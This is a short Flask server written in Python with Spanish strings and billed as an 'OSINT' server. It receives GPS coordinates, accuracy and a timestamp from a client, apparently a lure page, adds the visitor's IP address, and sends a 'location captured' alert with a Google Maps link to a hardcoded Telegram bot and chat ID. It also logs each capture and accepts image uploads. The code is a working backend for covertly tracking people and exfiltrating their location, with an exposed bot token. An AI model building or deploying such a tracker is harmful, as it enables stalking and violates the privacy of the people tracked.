from flask import Flask, request, jsonify, send_from_directory
import os
import uuid
import requests

app = Flask(__name__)

BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8605186812:AAET8973lR2dwBr10G_hsw2jbL6yaxLvBPI')
CHAT_ID = os.environ.get('CHAT_ID', '7891650726')
UPLOAD_FOLDER = 'uploads'

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def home():
    return "✅ Servidor OSINT activo. GPS OK.", 200

@app.route('/guardar_y_notificar', methods=['POST'])
def save_location():
    lat = request.form.get('lat', 'N/A')
    lon = request.form.get('lon', 'N/A')
    precision = request.form.get('precision', 'N/A')
    fecha = request.form.get('fecha', 'N/A')
    ip = request.remote_addr

    mensaje = f"🎯 UBICACIÓN CAPTURADA\n\n📍 Lat: {lat}\n📍 Lon: {lon}\n📏 Precisión: {precision}m\n⏰ {fecha}\n🌐 IP: {ip}\n\n🗺️ https://www.google.com/maps?q={lat},{lon}"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': mensaje}
    
    try:
        r = requests.post(url, data=payload, timeout=10)
        print(f"📤 Telegram enviado: {r.status_code}")  # Log en Render
        with open('log.txt', 'a') as f:
            f.write(mensaje + "\n---\n")
        return "OK", 200
    except Exception as e:
        print(f"❌ Error Telegram: {e}")
        return "Error", 500

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    file = request.files['file']
    filename = f"{uuid.uuid4()}.jpg"
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(file_path)
    return jsonify({'url': f'/static/{filename}'}), 200

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)